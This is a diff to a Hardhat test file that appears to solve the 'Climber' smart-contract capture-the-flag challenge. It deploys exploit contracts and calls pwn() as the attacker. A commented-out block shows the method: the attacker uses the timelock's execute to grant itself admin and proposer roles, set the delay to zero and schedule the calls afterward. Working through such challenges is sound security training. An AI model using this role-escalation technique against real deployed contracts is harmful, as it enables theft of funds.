@@ -53,6 +53,45 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        this.aaronvault = await (await ethers.getContractFactory('AaronVault', deployer)).deploy();
+        this.aaron = await (await ethers.getContractFactory('AaronExploit', deployer)).deploy(this.timelock.address, this.vault.address, this.aaronvault.address, this.token.address, attacker.address);
+
+        /*const iface = new ethers.utils.Interface([
+            'function grantRole(bytes32,address)',
+            'function updateDelay(uint64)',
+            'function schedule(address[],uint256[],bytes[],bytes32)',
+            'function aaronSchedule()'
+        ]);
+
+        await this.timelock.connect(attacker).execute([
+            // targets
+            this.timelock.address,
+            this.timelock.address,
+
+            this.timelock.address,
+
+            this.aaron.address,
+        ], [
+            // values
+            0,
+            0,
+            
+            0,
+            
+            0,
+        ], [
+            // dataElements
+            iface.encodeFunctionData('grantRole', [await this.timelock.callStatic.ADMIN_ROLE(), this.aaron.address]),
+            iface.encodeFunctionData('grantRole', [await this.timelock.callStatic.PROPOSER_ROLE(), this.aaron.address]),
+
+            iface.encodeFunctionData('updateDelay', [0]),
+
+            iface.encodeFunctionData('aaronSchedule', []),
+
+        ], "0x7465737400000000000000000000000000000000000000000000000000000000");*/
+
+        console.log('attacker addr', attacker.address);
+        await this.aaron.connect(attacker).pwn();
     });
 
     after(async function () {
